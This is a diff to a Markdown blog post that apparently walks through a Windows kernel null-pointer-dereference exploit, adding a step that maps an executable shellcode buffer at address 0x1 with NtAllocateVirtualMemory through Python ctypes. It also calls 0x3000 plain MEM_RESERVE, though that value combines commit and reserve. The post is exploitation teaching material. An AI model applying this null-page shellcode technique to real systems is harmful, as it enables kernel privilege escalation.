@@ -179,3 +179,36 @@ You can see we're about to call that function pointer and `esi` is `0`. Let's st
 
 ![](/assets/images/AWE/error.PNG)
 
+So we error out (but thankfully no BSOD). Let's see if we can allocate a shellcode buffer there. To do so, we'll use the `NtAllocateVirtualMemory` API. 
+
+We can see the [MSDN Documentation](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory) and prototype:
+```c
+__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
+  HANDLE    ProcessHandle,
+  PVOID     *BaseAddress,
+  ULONG_PTR ZeroBits,
+  PSIZE_T   RegionSize,
+  ULONG     AllocationType,
+  ULONG     Protect
+);
+```
+
+This API actually allows us to allocate memory at address `0x1` and allows us to specify a region size. I'm going to call the API as follows:
+```c
+result = ntdll.NtAllocateVirtualMemory(
+        GetCurrentProcess(),
+        pointer(c_void_p(1)),
+        0,
+        pointer(c_ulong(4096)),
+        0x3000,
+        0x40
+    )
+```
+
++ `GetCurrentProcess()` will be a handle to our current process
++ a pointer to a `PVOID` `0x1`,
++ `0` for `ZeroBits`,
++ `regionsize` of 4096 bytes,
++ `0x3000` is the constant hex value for `MEM_RESERVE` [link](https://docs.microsoft.com/en-us/scripting/winscript/reference/ijsdebugdatatarget-allocatevirtualmemory-method),
++ `0x40` is the constant hex value for [`PAGE_EXECUTE_READWRITE`](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)
+
